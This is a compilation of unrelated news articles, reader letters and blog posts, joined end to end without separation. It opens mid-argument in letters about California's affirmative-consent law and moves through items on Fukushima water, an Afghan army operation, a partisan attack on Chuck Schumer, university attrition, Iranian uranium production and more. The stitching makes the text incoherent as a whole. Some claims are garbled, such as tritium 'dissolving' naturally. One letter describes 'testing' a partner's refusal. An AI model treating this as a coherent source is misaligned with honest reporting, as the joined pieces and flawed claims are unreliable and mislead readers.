This, to me, is exactly why women and men need California's new affirmative-consent law! It changes not just what we expect of men, but what we expect of women. We are in the middle of a transition ... to a world in which sex is collaborative and wanted. But we haven't yet had the kind of cultural change that causes all individuals to rethink the new burdens that this standard places on them. For men, I think it lifts burdens. Judging by the stories you've shared, it hasn't lifted them yet. And this is where new expectations for women come in. I'm not suggesting that women no longer think sexual leadership is attractive, but that women assert their desires .... Playing a game where saying "no" or "wait" is a ploy to realign one's self-perception as a slut versus a prude merely reinforces the notion that women are two-dimensional Madonnas or Whores, or that women always want it. It's up to women to stop playing this game—to see asking as attractive, or if not, to ask for the more assertive behaviors they want, to see deference as respect, to reject the idea that the only option available to our gender is to wait passively for the act and when unwanted, say no. I urge others, especially those sympathetic to your experiences, to see this change as a positive one simply because it relieves men's pressure to read minds. It relieves their grasp of all the power in a sexual encounter ... there's a big difference between assertiveness and assault, and it's not up to you alone to tread those waters.
The next correspondent is a somewhat unlikely supporter of California's law:
I am 27 and a recent law-school graduate. I remember my first semester at law school in criminal law learning about an older study of college coeds at University of Texas. Around 75 percent had reported saying "no" to sex when they intended or wanted to have sex. In college, I rarely made the first move, and hearing this caused me to rethink my strategy. Assertiveness is clearly a desirable quality. Thereafter I began to be more bold but also conscious of body language and other signals. If a partner refuses initially, I pay close attention to whether she said, "I probably shouldn't," or unequivocally, "no." I sometimes test the "no," but will never cross the line to aggressive or pushy. When I heard about California's new law, I thought back to our discussion of elements of rape and the previously mentioned study. My reaction was that this law is completely removed from the reality of modern dating and sets a potentially ridiculous standard for students to meet. However, I think ultimately it is positive. Being assertive and recognizing body language are things that took me years to learn. This new standard will encourage partners to be more conscious of those small signals since consent may be nonverbal cues (like leaning in slightly when face to face versus cheating away [a stage term]). It will encourage women to be more open and assertive in their sex lives. (It is okay and does not make you a slut to say "yes," and saying "no" when meaning "yes" is confusing.)
While the reality is that there will not always be explicit consent in adult relationships, college is different. The peer-pressured, alcohol-fueled hook-up culture (I went to Arizona State for undergrad, so not a total exaggeration) warrants greater emphasis on consent, even if that means missing potential hook-ups. Remember, this is a standard to be implemented in disciplinary hearings, not a criminal statute, and holding college students and administrators to higher standards is understandable given their terrible track record. Students should remember that being assertive and confident does not preclude being respectful.
A male opponent of California's law writes:
If women want to be treated as equals—as they should be and as I do treat them—then it isn't too much to expect them to say "no" or "stop" if they don't like whatever a sexual partner is doing. If they say that one word, even once, it should be totally respected. If a man doesn't listen, that's rape, and he should be thrown in jail for years. But if those are the stakes, years behind bars probably getting raped, or in the current law getting expelled from college and branded a rapist, asking for a simple "no" or "stop" is not too much to ask. The alternative is that some men will go to jail for misunderstandings or women who changed their minds after the fact. Of course men should ideally avoid even those situations, but how can I take women seriously as strong, independent equals if they infantilize themselves so much that they won't even take responsibility for saying no? If a man is threatening violence if she says no, even nonverbally, that's different. I'd vote for rape in those cases, but the standard should be, were any actions taken that would make a rational actor fear saying no? If not, then it shouldn't be rape even if there wasn't affirmative consent.
A woman explained why she opposes California's law, in part by sharing a harrowing experience:
My junior year of high school, a male "friend" stood between me and the door of an empty classroom. He asked for sex repeatedly, and I had repeatedly said no. When I attempted to leave, he stopped to "hug" me, tightly, and asked again. That time, I felt I could not get out of the room without fighting a fight I would likely not win, or giving up. I said yes—and although the experience left me with what my college psychologist would later call "symptoms of PTSD," under California's law, this would be considered consent ...
Her takeaway:
Requiring women say "yes" to demonstrate consent does nothing to help women for whom that "yes" was coerced or threatened.​ And women who gave "affirmative consent" under duress would have no legal recourse—their "yes" would be evidence against them.
She objected to "any law that uses a plaintiff's actions (or lack thereof) to determine the defendant's guilt" because it "necessarily places responsibility on the plaintiff to avoid being the victim of a crime—the jury tries the victim's responsibility, rather than the defendant's potential crime." What would she prefer?
The ideal policy would be sort of like a rational basis test for free will ... could the accuser rationally believe the defendant may legitimately harm them if consent is not given? In cases in which consent was not given and the accuser was harmed, the verdict should be obvious. In cases in which consent was given under psychologically questionable circumstances, this test would put pressure on the courts, or other evaluating bodies, to analyze the defendant's actions and the messages said actions could communicate. If these actions could reasonably communicate an intent to harm, then consent was not given freely.
Another woman looks back on college and explains why she didn't like giving affirmative consent:
Women don't want to be labeled sluts. Token resistance lets us dodge that question. I think what has bothered me about being asked for consent is I'm never really sure if I'm into it. So thinking about it makes me confused. I haven't been taught that it is okay to be into a guy, how to recognize if I'm attracted—all those things, I'm only thinking about now. So yeah, asking me if I want to can be difficult for me.
I replied, "If you're not really sure when asked for affirmative consent, do you think that means the standard is a good thing, and that those hookups ought to be stopped, or that it's a bad thing, because despite your uncertainty you want those experiences?"
Chennai: There was high drama at the Kumarakottam Murugan temple in Kancheepuram on Tuesday after a Russian tourist sat with the destitute outside the temple and sought alms from the public. Curious people started enquiring of the man as to what he was doing there and since all their queries were met with only a gesture asking them to put some money in his cap, they decided to inform the police. A team from the Siva Kanchi police station reached the temple and questioned the man and found out that he was a research student who had simply exhausted all his money.
Police identified him as Evangelin Berngowe, a 32-year-old research student from Russia. He had arrived in India on September 8 on a tourist visa and after touring places in North India, Berngowe had reached Kancheepuram by bus from Bengaluru, police said. Police investigations revealed that he had spent all his money and the balance in his mobile phone. Worse, he had forgotten the PIN number of his debit card. After searching in vain for fellow Russian tourists across the temple town, he finally sat down at a temple and began to seek alms.
“We checked his travel documents, passport and visa. All documents are perfectly valid. He had spent all his money and was not sure how to reach Chennai,” a police officer said. The Siva Kanchi police gave him Rs 500 and put him on a suburban train to Chennai. Police asked the man to get down at Egmore and take an autorickshaw to the Russian embassy in the City.
HAYWARD — Anthony Pirone, a former BART police officer fired in 2010 for escalating a confrontation with passengers that led to the killing of Oscar Grant III, has been charged with unemployment fraud.
Pirone, now member of the U.S. Army, is accused of collecting unemployment checks from the state for about seven months even though he had a job, court records show.
Pirone is accused of cashing unemployment checks from May 2011 through December 2011 and lying to state officials about not having a job even though he had enlisted in the Army and began working full time at Fort Bragg.
Pirone began collecting unemployment in May 2010 after BART fired him for his actions on the Fruitvale station platform in the moments before Grant was killed by former BART police Officer Johannes Mehserle, according to court records.
In May 2011, Pirone enlisted in the Army and began working full time but never notified the state unemployment office, court records state. In fact, Pirone is accused of lying at least 10 times in sworn affidavits that he was unemployed, the court records state.
The amount of money Pirone is accused of illegally taking from the state is unknown but when he was fired by BART in 2010, Pirone was making more than $100,000 a year in salary and more than $3,000 a year in overtime.
Pirone's attorney, Bill Rapoport, could not immediately be reached for comment.
Pirone was charged on April 15. He was supposed to appear in court this week but is serving in Afghanistan and could not attend court. His case was postponed until next year, when he is scheduled to return to the United States.
Teresa Drenick, spokeswoman for the Alameda County District Attorney's Office, declined to comment Thursday.
Pirone's actions at the Fruitvale station the night Grant was killed were criticized by many, as he was blamed for escalating tensions between New Year's Eve revelers returning home from San Francisco and BART police officers.
Pirone, a former member of the Marine Corps military police and a federal officer for Lawrence Livermore Laboratory, was the first BART officer to respond to a call at the station. The call was for a fight on a train and Pirone arrived at Fruitvale with his partner, Marysol Domenici.
Video recordings from the incident showed Pirone acting aggressively as soon as he arrived on the platform. He was recorded grabbing one of Grant's friends by the hair and later, punching Grant. Pirone also was recorded yelling racial epithets at Grant.
Witnesses who testified in the murder trial against Mehserle also described Pirone as being one of the most aggressive officers on the platform during the early hours of New Year's Day in 2009.

It's Halloween, and this year on TODAY, that means it's time to put on your boots and kick back with some of country music's greatest performers — or at least some pretty convincing stand-ins.
That's right! The whole TODAY gang has gone country, and we're not just talking cowboy hats.
Reba McEntire — the real Reba — did the introductions for us Tuesday morning. Check these Nashville-ready transformations:
The fun kicked off with an achy-breaky Carson Daly decked out in his Billy Ray Cyrus best, complete with a long flowing mullet.
Then our weatherman-and-more, Al Roker, showed off his six-string and a couple of braids as he channeled legend Willie Nelson.

Megyn Kelly dressed to impress as none other than hit maker Shania Twain.
As for Hoda Kotb and Kathie Lee Gifford, they revealed country duds equally suited for the concert stage or prime-time TV — as a couple of popular "Voice" coaches.
Hoda suited up as her favorite country crush Blake Shelton.
Nathan Congleton / TODAY
And KLG looked the part as singer-songwriter Miley Cyrus.
Now hold on to your hat! Savannah Guthrie and Matt Lauer's iconic duo will have you doing a double-take — and singing the chorus of "Islands in the Stream."
Savannah took on the man known to fans as The Gambler, Kenny Rogers.
Nathan Congleton / TODAY
And Matt, well, get a load of his getup! He really got into character — and then some — as everyone's favorite rhinestone-loving country queen, Dolly Parton.
Nathan Congleton / TODAY
Of course, this isn't the first time Matt's gone all out as a celebrated singer.
But this was the first time he had help from his inspiration herself.
From wig to beauty mark to, ahem, everything in between, Parton showed him the secrets behind her signature look.
She wasn't the only superstar to visit her TODAY country clone. The real-deal Billy Ray Cyrus, Shania Twain and Blake Shelton also stopped by to see their look-alikes.
Shelton even stuck around for a real Halloween treat on our plaza — a concert!
He performed "I'll Name the Dogs," the first single from his new album, "Texoma Shore," and a brand-new track called "I Lived It."
That's what we call a happy Halloween.
An Afghan operation to flush out Taliban rebels and showcase growing military competence has turned into a debacle, with many troops dead or captured and commanders pleading for help, The New York Times reported Friday.
A senior US official with knowledge of the mission — apparently not coordinated in advance with NATO officers — said commanders called for backup from foreign forces after at least 10 Afghan soldiers were killed and up to 20 captured since the operation began August 3 in a rugged region east of Kabul.
Fighting has raged so intensely over the past week in the area around Bad Pakh village, in Laghman province, that the Red Cross has been unable to reach the battle zone and evacuate the wounded and dead, the Times reported.
“There are several soldiers unaccounted for and killed,” a senior American military official was quoted as saying on condition of anonymity because the operation was ongoing.
He said “about 10” soldiers had been killed.
“There are a lot of lessons to be learned here,” he said. “How they started that and why they started that.”
NATO has reportedly sent in French and American rescue teams.
A high-ranking official in Afghanistan's Ministry of Defense said the military's plan was betrayed, and that Taliban fighters were lying in wait to ambush the bulk of the 300 men from the First Brigade of the 201st Army Corps.
The ministry's spokesman, Major General Muhammed Zahair Azimi, said seven soldiers had died and that an unknown number were taken prisoner.
“We can not say the number captured because some of them were in difficult places, but some of our soldiers were captured by the Taliban,” Azimi said Wednesday, according to the Times.
A Taliban spokesman said 27 Afghan soldiers were killed, 14 wounded and eight captured, the paper reported. The Taliban often exaggerates its claims of damage and casualties.
The mission marks a major embarrassment for the Afghan army, which said this week it has met a target of 134,000 troops two months ahead of schedule, and as it gears up to take responsibility for security from US-led NATO forces by 2014.
Despite its steady expansion of operational capacity, the Afghan army runs few major missions on its own.
Afghanistan's troops are at similar force size to NATO troops on the ground. War monitor group iCasualties says 521 coalition soldiers were killed in Afghanistan in 2009, while the Times reported 282 Afghan soldiers were killed.
GeoEye-1, the powerful imagery satellite that is perhaps best known as the “Google satellite” (because Google has a deal to use its pictures for its Google Maps and Google Earth products), will be focusing its lens on the Inauguration of President Obama next week. The company notes that while there will be plenty of cameras covering the event on the ground, and some in the air, GeoEye-1 will be the only one offering a perspective from space.
The satellite will be 423 miles above Washington, D.C. on January 20 at 11:19AM EDT. While it will be moving 17,000 miles per hour, it will still be able to look down at the Earth and see objects about a half meter in size. The image above (which I actually had to shrink due to upload size limits) is one the satellite took a few weeks ago of the area. Last month, we posted a picture that the satellite took of Google's campus.
It's not Google who is requesting these images, and it's not the government either. Instead, it's a company initiative by GeoEye.
“An image of the Inauguration has been requested by many news organizations,” a GeoEye spokesperson tells us. “So, if the weather cooperates, the image will be distributed to news organizations and bloggers around the world. The image will be available about three hours after it's taken.”
If you'd like some to see some footage a bit closer up on the action, you may want to check out one of the live streams.
Update: Here are the pictures from President Obama's inaugrual, as seen from space.
Japan may dump 1 million tonnes of nuclear waste in ocean

Digital Reporter
Monday, November 27, 2017, 6:14 PM - In March 2011, a powerful earthquake and tsunami crippled Japan's Fukushima Dai-Ichi nuclear plant, leading to the eventual meltdown of three of its six nuclear reactors.
Today, contaminated water continues to leak into the Pacific Ocean.
More than a million tonnes of radioactive water is currently being stored at the plant's power station in 900 tanks, and officials aren't sure how to dispose of it. Waste continues to accumulate at the plant at a rate of 150 tonnes a day.
The plant's reactors can't be repaired but cooling water needs to pump constantly to prevent overheating. That water becomes radioactive. It then leaks out of the damaged chambers, ending up in the power station.
Multiple news outlets say the government is being advised to slowly leak the contaminated water into the Pacific Ocean. That's alarmed local fishermen, who are struggling with a stigma about Fukushima's water.
Tests have shown the majority of fish caught near the plant are now safe to eat, but consumers remain hesitant. Local fishermen say the release of radioactive water could kill what's left of the fishing industry in that region.
The stored water remains a huge safety risk in its current state. Should another earthquake or tsunami hit it could spill, uncontrolled, into the ocean.
The water has been treated and all radioactive elements, except for tritium, have been removed. Experts say tritrium is safe if released in small, controlled amounts. It's been suggested the water be diluted and released in 400 tonne daily increments over the course of a decade. Others have proposed moving the tanks into storage and delaying the release until 2023, when half of the tritrium in the water will have dissolved naturally.
But before the water is released, experts are urging the government to address public concerns.
“A release only based on scientific safety, without addressing the public's concerns, cannot be tolerated in a democratic society,” Naoya Sekiya, an expert on disaster information and social psychology at the University of Tokyo, told Japan Times.
“A release when people are unprepared would only make things worse.”
In 2016, officials activated a controversial ice wall in an effort to prevent groundwater from mixing with the polluted cooling water.
Japan's nuclear watchdog, NRA, concluded the wall isn't effectively diverting the water.
Officials haven't announced when they'll finalize their decision.

Poly Life 101: Taking Turns (with Gina) June 7, 2013
Posted by shaunphilly in Polyamory Tags: family
OK, that title sounds lascivious, but just give me a sec and I'll show that it's not what that sounds like.
Since I have decided to write about more every day polyamorous life rather than always writing overly-philosophically about issues all the time, I figured I'd start with a bit about yesterday.
Thursdays are a day off for me, right now. So, that meant that yesterday I got up early, did some auto-didactic reading, exercised, made myself a healthy lunch, then spent some quality time further educating myself by reading various interesting blogs and considering the social and cultural ramifications….
OK, that was mostly bullshit. I did eat a healthy lunch (lettuce, spinach, red pepper, and tomato salad topped with chicken with a balsamic/oil dressing). The rest of the day was spent watching Game of Thrones (I'm trying to catch up, and just started watching it a week or so ago). I'm quite enjoying it, and am only a few episodes behind real time. Oh, I also listened to the new Daft Punk album, Random Access Memories, for like the billionth time since I acquired it a couple of weeks ago. Seriously, that album is amazing! I am really having a problem not listening to it. It plays in my head whether it's actually playing or not.
But, back to polyamory. To start with, not only did I make myself said salad, but I made Ginny some to take to work with her as well (because I am uber-husband). Then, once she was gone I started watching Game of Thrones, and at some point in the day Gina asked me, over Gchat, to take the ground turkey out of the freezer to defrost. After finishing the episode I was watching, I asked her what she intended to make for dinner, and whether I could help. She said she planned on making sauce and meatballs, and knowing that I make awesome sauce (I'm also made of awesome sauce, it seems) and that Ginny (who subsequently came home from her short work day) makes meatballs well I suggested that I make some sauce, and Ginny volunteered to make the meatballs. And so that's what we started to do, while drinking some fine Belgian-style ales (Kwak and Three Philosophers).
At some point after that, Gina realized she could just come home from a long day at work and put her feet up, and thus it became our turn, Ginny and I, to make dinner. Gina had planned on coming home and cooking, even though it was my day off and I like to cook, but I decided to do something nice and allow her to relax when she got home. Most days I'm not home for dinner, because I work in the evenings, but when I am home I look to cook. And having 5 people in the house means that there a number of everyday household chores and such which we take turns doing. Not everyone cooks regularly, not everyone cleans regularly, and we are not always all around at the same time either. But on Thursdays we are all usually here for dinner and thus it's a situation where 1 or 2 of us accepts the duty (I'm very attempted to reference Kant's deontological ethical rule here, but will resist more than this meta-comment…) of taking on a task for everyone.
Sometimes it's shopping (Gina does that most often), sometimes it's cleaning (that's mostly Gina and I), and sometimes it's barking at 3:00 AM (that's usually Lola, the dog). Whatever the tasks are, there are tasks to be done and just like another kind of family, say one with 2 parents and some kids, those tasks are accomplished by different people at different times. And, like families with children, there are certainly some jobs some people just don't do (for various reasons), or at least rarely. My personal inclination is to be organized, relatively clean, and efficient when it comes to house-maintenance. As a result of that, I end up cleaning things before other people tend to because I'm thinking about it and I care about it more than them. When it comes to planning events, making executive decisions, or me remembering to take my phone with me when I leave for work, other people take up those roles because those are not my strong points.
The point is that this arrangement, this abnormal relationship matrix of 5 adults living together with various types of sexual and non-sexual relationships, is not really that much different than any other family. The advantage, in this case, is that with more capable adults around the jobs that need to be done can be picked up by people who have the time and/or the inclination to do so. And so when it comes to how we manage all the food for 5 people, that requires not only an app to add groceries to a database we can all access easily, but a expenses spreadsheet which we all contribute to (according to our relative incomes), and the time and spatial acuity to Tetris-like fit all the food into the fridge. Then, when it comes to cooking the food into delicious meals, cleaning up afterwards, etc we have all done something to contribute, and that's how this poly family works.
So, yesterday Ginny and I took our turn to cook, and since Gina was involved (in that we were doing it to help her) the situation it was with, or perhaps concerning, Gina. In other words, Taking turns (with Gina). Rationalizing creepy phrasing is fun.
Apparently, creepiness mostly what I contribute. OK, I'm done now.
Just remember, you don't have to be creepy to be poly. In fact, it doesn't help at all. Nobody told me this until recently. Thanks, everyone…..

SAN DIEGO — About 30 animal rights activists picketed outside the Ringling Brothers and Barnum & Bailey Circus Thursday evening to protest the treatment of the performing animals.
“Ringling brothers is cruel and mean to their animals,” the protesters chanted repeatedly.
Inside the arena, It was hard to tell whether the animals were or had been abused. The animals seemed fine as they walked into the area, welcomed by the cheers of thousands of people.
But protesters say it's what you don't see behind the scenes that is sinister.
“The abuse is horrendous, it's the way they treat these animals before the show,” said Ellen Ericksen, one of the protesters.
Ericksen and the other protestors lined the main entrance to the arena holding signs asking people not to attend any of the Ringling Brothers Circus performances scheduled for this weekend.
They say a video produced by People for the Ethical Treatment of Animals shows handlers and trainers repeatedly striking elephants before the start of a show. They say the animals are hit with a “bull hook,” which can penetrate thick skin and generate great pain. The protesters say this is how handlers control the elephants.
Ringling Brothers representatives say the video was creatively edited, editing down hundreds of hours of video tape, shot over a six month period to a minute and a half. Ericksen insists video or no video, abuse of elephants is rampant.
“They're tied down and beaten into submission until their spirits are broken. There's nothing kind about what Ringling Brothers does to animals here,” she said.
During Thursday night's performance, Fox 5 cameras documented no evidence of abuse. Before the show, we were allowed access to the pens where the elephants are kept, and again, witnessed no mistreatment.
“We are very transparent and our doors are always open to the public to come out look at our animals so they can see how healthy all of our animals are just by looking at them,” said Ryan Henning, who is responsible for the care of the animals while on tour.
Chuck Schumer Sinks to The LOWEST Approval Rating EVER in New York
Chuck Schumer is another leftist relic who should have left politics decades ago.
Perhaps people, check that, Democrats finally realize what conservatives have known for some time. Schumer is toxic.
Recently Democratic Congressman Tim Ryan used that word to describe Democrats. He was speaking of Schumer. What a polarizing figure Schumer is. The man epitomizes partisan hack.
President Trump has made a couple of the same moves as Obama, and Schumer hammers Trump. Needless to say Schumer was completely silent with Obama or hypocritically agreed with Obama.

Trending: SCOTUS Justice Send Warning to FAKE NEWS Journalists
Times they are a changin.' America First resonates with Americans. And with President Trump crushing the fake news media, Schumer finds himself caught in the riptide.
A new poll released by Siena College shows Schumer's ‘block at all cost' strategy is hurting his standings among New Yorkers.
A Siena College poll released on Thursday found that 37 percent of New Yorkers have an unfavorable opinion of Schumer. This approval rating represents Schumer's worst rating ever in this category. Further, the poll also rated Schumer's favorability among New Yorkers at its lowest point ever.
As I warn with all polls, consider these polls are heavily weighted towards leftists. So the news is worse than it appears. Schumer and other leftists have bet on their obstructionist strategy, and polls suggest the strategy has failed.
I was on French TV where leftists argued that Trump can't fill posts in his government. They acted as if the lack of filled positions proves Trump to be a novice. However, as the Washington Examiner reported recently, Senate Democrats have filibustered two-thirds of President Trump's picks to fill administration posts.
This tactic, as well as the Left's “Russia gambit” are the reasons Schumer (and Democrats in general) find themselves in big trouble.
As President Trump continues towards “Rock Star” status, undoing all the nonsense of the Obama administration, leftists fight for no reason. Trump's recent declaration that he would allow Obamacare to fail gave Schumer renewed hope.
Now Schumer, et al pretend that Trump wants Americans to die. In fact that's what Trump tries to prevent. By letting Obamacare remain, President Trump implies that the legislation will die from its own weight.
So the hyperbole by Schumer, accusing President Trump of “actively trying to undermine the healthcare system in this country, using millions of Americans as political pawns in a cynical game” will fall on deaf ears.
Leftists are used to facing Republican pansies. That ilk has become used to losing. Those days are over.
Trump is a winner. And like with the travel order, he will get his way on a new healthcare plan. After Obamacare fails, as President Trump said, the Democrats will come crawling back on healthcare.
Know that Democrats feel the pressure. According to CNS, Schumer told the news conference:
Now, it's getting clearer and clearer that Senate Republicans won't be able to pass either their bill or a backup plan of repeal without replacement. We Democrats believe that the time has finally come for our Republican colleagues to take us up on our offer of working together to improve the health care system rather than sabotage it. Evidently, President Trump is proposing a different path. He wants to throw up his hands rather than roll up his sleeves to work with us and solve the problem. But let's be very clear about what the president is proposing and where his path would lead. The President would not be quoted, “‘letting Obamacare collapse.' He is active, actively trying to undermine the health care system in this country, using millions of Americans as political pawns in a cynical game. By continuing to deny the insurance markets their certainty that they need to function, the President is playing a dangerous game with the health care of this country. So our Republican colleagues here in the Senate have a choice to make. They can follow the President down a path that will lead to higher premiums, less care, and millions of Americans losing coverage. They can join President Trump in trying to sabotage the system and hurt millions of innocent Americans to try and make a political point that has failed already. Or they can start today working with Democrats. We can work together to lower premiums…to stabilize the markets…to improve the quality of health care.
People are more concerned about jobs, than insurance.
And as soon as Trumpcare kicks in and premiums drop, the Democrats will have some explaining to do.
In fact, based on Schumer's poll numbers, the clock ticks on his explanation.
Jacinta Mitchell was admitted to a combined arts and law degree at Notre Dame before she sat her HSC. Students with an ATAR above 95 are least likely to drop out, with less than 3 per cent of this cohort withdrawing from study in 2014. Those with an ATAR between 30 and 49 are the most likely to drop out, with an attrition rate of about 24 per cent in 2014, followed by students with an ATAR between 50 and 59, with a dropout rate of 20 per cent. Students admitted on a non-ATAR basis are the third most likely group to drop out of university, with an attrition rate of nearly 18 per cent. The attrition rate of non-ATAR students has been rising since 2011 when it was about 15 per cent, and has now overtaken the dropout rate of students admitted with an ATAR between 60 and 69.
The overall attrition rate among Australian higher education providers is 21.01 per cent in 2014, up from 18.86 per cent in 2005. When adjusted for students who leave a particular course but continued to study, the overall attrition rate is 15.18 per cent, up from a low of 12.79 per cent in 2011. Jacinta Mitchell, 19, is a second-year law student at the University of Notre Dame's Sydney campus, and part of the growing cohort of students admitted to university without an ATAR. She got her acceptance letter a month before she sat her HSC in 2015, and says early entry processes provide a "more holistic view of an individual rather than marks on a transcript" and take some of the stress off year 12 students. "I still tried really hard but it was just one thing you had in the back of your mind, that if everything didn't go to plan you would still get into uni," Jacinta said. Notre Dame is one of the few universities which doesn't use ATARs for admission at all, and instead relies on students' HSC results, their year 11 and 12 reports, a personal essay and an interview. It has a relatively low attrition rate of 9.57 per cent, significantly down from 16.5 per cent in 2005.
The university's pro-vice-chancellor Professor Margot Kearns said the institution is somewhat unique in the rigour of its non-ATAR entry process, which has been changed in recent years to make academic achievement and leadership mandatory components. "We actually try to see what's happening in the student's life and what their aspirations are, and look at whether they're choosing the right course and the right university," Professor Kearns said. While a student's ATAR and basis of admission is an important indicator of their likelihood of completing their degree, other factors including the institution at which they are studying, whether they are studying part-time or off-campus, and age are more important factors in degree completion, the discussion paper found. For example, students studying part-time and off-campus are at a similar risk of degree non-completion as students with ATARs below 50, according to recent findings by Andrew Norton, who was part of the 2014 Review of the Demand Driven System. Both the number of students studying part-time and off-campus have increased significantly in recent years, with about 19 per cent of students enrolled part-time in 2014, compared to a low16.5 per cent in 2011.
Similarly, 14.6 per cent of students is studying off-campus in 2014, compared with a low of 8.3 per cent in 2006. Belinda Robinson, chief executive of peak body Universities Australia, said: "[The paper] states, point blank, that attrition is not because of poor admission standards or growing student numbers. A large number of students today enter university via a path other than an ATAR and that is not a bad thing. "Survey after survey shows that the reasons students give for not completing their studies are beyond institutional control. These are reasons that are personal – like financial pressures or juggling family responsibilities." While the discussion states that claims of a "crisis in attrition rates" are unfounded, it has recommended that higher education providers improve the transparency of the admissions process to increase degree completion and provide earlier support to students at risk of dropping out. "Having all relevant information up front would improve [students'] chances of choosing and completing the right course," the paper states.
Media playback is unsupported on your device Media caption Mystery of lost wedding snaps found in old camera is solved
A family has contacted the BBC to say they are the subjects of a series of mystery wedding photographs.
Alastair Bremner said the pictures were taken at the marriage of his sister Kathleen to Pete Maloney.
Romanian Alex Galmeanu discovered the images on undeveloped film inside a camera he bought online.
Mr Galmeanu thought the wedding had taken place in Scotland, but the venue has now been identified as the Burleigh Court Hotel in Gloucestershire.
Mr Bremner said his mother and father, Betty and Alex, were originally from Scotland but moved to Gloucestershire, where the children grew up.
His sister, known as Kathy, now lives in Cheltenham. Pete Maloney emigrated to Australia.
Mystery photographer
Alastair said the car in one of the pictures is his father's Austin Maxi.
He thinks it was bought near Dollar in Clackmannanshire, where his parents lived before moving south. The car eventually covered 280,000 miles without a change of gearbox.
Mr Bremner identified other people in the pictures including his sister Morag, Pete Maloney's parents, and an aunt and uncle, Grace and Bob Thomas.
One mystery remains. Mr Bremner does not know who took the pictures.

Mr Bremner said the wedding did not turn out to be a happy ever after event.
He said: "My sister lives in Cheltenham at the moment.
"She married Pete but their wedding didn't last that long unfortunately.
"Pete now lives in Australia."
Alastair's brother John said the two images which do not feature the wedding may be of most use in tracking down whoever took the photographs.
He told the BBC: "Obviously this is a friend who attended the wedding.
"I can name everyone there apart from the last two photographs.
"That must be his family. It looks like he's taken a picture of his garden and it looks like he's got some grandchildren there."
Hotel venue
The general manager of the Burleigh Court Hotel, Christine Read, had earlier partially solved the mystery when she confirmed the group shot was "definitely" taken on the hotel's back terrace.
The hotel, near Stroud, has changed owners three times since 1979.
Ms Read, who joined the hotel staff in 1980, told BBC Scotland she knew it was her hotel "without a shadow of a doubt".
"As soon as I saw the first picture with the trees I knew. And then the second photo has the lodge at the end of our drive," she said.
Professional fashion photographer Mr Galmeanu, who discovered the images last week, had posted them online in the hope of returning the originals to the couple or a relative.
Writing on his blog, Mr Galmeanu said he found the film inside a Balda Baldix camera he bought from an online seller near Birmingham.

Speaking to the BBC after the Bremner family had come forward, he said he was delighted to be able to find the pictures and make contact with those involved in the wedding.
Mr Galmeanu added: "This is a once in a lifetime opportunity here.
"I'm very happy to do that.
"It's a story I will tell to my grandchild - if that's possible."

Obamacare will increase the long-term federal deficit by $6.2 trillion, according to a Government Accountability Office (GAO) report released today.
Advertisement
Senator Jeff Sessions (R., Ala.), who requested the report, revealed the findings this morning at a Senate Budget Committee hearing. The report, he said, “confirms everything critics and Republicans were saying about the faults of this bill,” and “dramatically proves that the promises made assuring the nation that the largest new entitlement program in history would not add one dime to the deficit were false.”

President Obama and other Democrats attempted to win support for the health-care bill by touting it as a fiscally responsible enterprise. “I will not sign a plan that adds one dime to our deficits — either now or in the future,” Obama told a joint-session of Congress in September 2009. “I will not sign it if it adds one dime to the deficit, now or in the future, period.”
The new report exposes the “lack of honesty” surrounding such claims, Sessions argued. “The big-government crowd in Washington manipulated the numbers in order to get the financial score they wanted, in order to get their bill passed and to increase power and influence,” he said. “The goal was not truth or financial responsibility, but to pass the bill. This is how a country goes broke.”
The GAO report is essentially the first attempt to isolate and calculate Obamacare's impact on the deficit beyond the traditional ten-year budget window. GAO ran two simulations “based on broad sets of assumptions about health care spending and other components of federal spending and revenue” over a 75-year period. First, a baseline-extended simulation, which “illustrates the long-term outlook assuming federal laws (applicable at the time the simulation was run) remain unchanged,” and second, an alternative simulation, which “illustrates the long-term fiscal outlook assuming historical trends and policy preferences continue.”

The baseline scenario is far more optimistic, largely because it does not take into account the concerns — expressed by the Congressional Budget Office (CBO), the Centers for Medicare & Medicaid Services (CMS) Trustees, and Medicare's chief actuary — about “whether certain cost-containment mechanisms included in PPACA can be sustained over the long term.”

However, the GAO report concluded that even under these “more optimistic assumptions,” Obamacare's cost-control provisions “were not sufficient to prevent an unsustainable increase in debt held by the public.”
The alternative scenario, which incorporates the more realistic “alternative projections” suggested by CBO, the CMS trustees, and the chief Medicare actuary, is even more dire. Under this scenario, the “primary deficit” increases by 0.7 percent of GDP over the 75-year period. The GAO does not put a dollar value on that figure, but Senate Budget Committee staff has calculated, and GAO has confirmed, that it would amount to a $6.2 trillion increase in the federal deficit.

The decline of manufacturing jobs across the U.S. has hollowed out communities and depressed the working classes across broad swathes of the country, but it has also had an unexpected social side effect: fewer marriages.
That's the conclusion of economist David Dorn of the University of Zurich, who wrote a paper with colleagues David Autor and Gordon Hanson, titled "When Work Disappears: Manufacturing Decline and the Falling Marriage Market-Value of Men."
Like other social scientists have, the team noted "a steep decline in the prevalence of marriage among young adults, and a sharp rise in the fraction of children born to unmarried mothers or living in single-headed households." They expected that "a potential contributor to both phenomena is the declining labor-market opportunities faced by males, which make them less valuable as marital partners."
Indeed, they found that "trade shocks to manufacturing industries have particularly negative impacts on the labor market prospects of men and degrade their marriage-market value along multiple dimensions."
In an article about this research, Thrive Global points out that, "since 1980, a full third of all manufacturing jobs — five million since 2000 — have evaporated, making guys less appealing as potential husbands in the process." Many American men who lost steady, relatively well-paying factory jobs, Dorn found, became cash-strapped and opioid-addicted. As he tells Thrive Global, they "become less attractive partners because they have less money and start doing drugs."
"Remarkably, half of unemployed men in the U.S. are on some sort of painkiller," writes Thrive Global. "Unremarkably, all that makes long-term monogamy less appealing."
In response, fertility rates in those areas went down, the economists noted, and women who did have kids were more likely to proceed with parenthood alone, even though they didn't have a lot of resources. Forty percent of all babies now are born to single moms or to unmarried partners. That's a problem, Dorn and his colleagues write, because "poverty is far more prevalent among single-headed than married households."
In short, the closing of factories can be devastating: "The loss of jobs — for men especially — is the root cause of the social anomie found in poor communities."

AEOI Chief: Iran to Launch New Uranium Dioxide Production Units Soon
TEHRAN (FNA)- Head of the Atomic Energy Organization of Iran Ali Akbar Salehi lauded the AEOI experts for their relentless efforts to develop the country's nuclear industry, and announced that new uranium dioxide production lines will be launched in the near future.
“The UO2 (production) lines will be completely launched in the next few months,” Salehi said while visiting the different sections of the Uranium Conversion Facility (UCF) in Isfahan.
The AEOI chief underlined that the country's nuclear industry has reached a level that it should focus on the generation of science and technology as well as research development instead of copying other's knowledge.
In April 2011, Iran launched its first UO2 production unit on the occasion of the country's 'National Day of Nuclear Technology'.
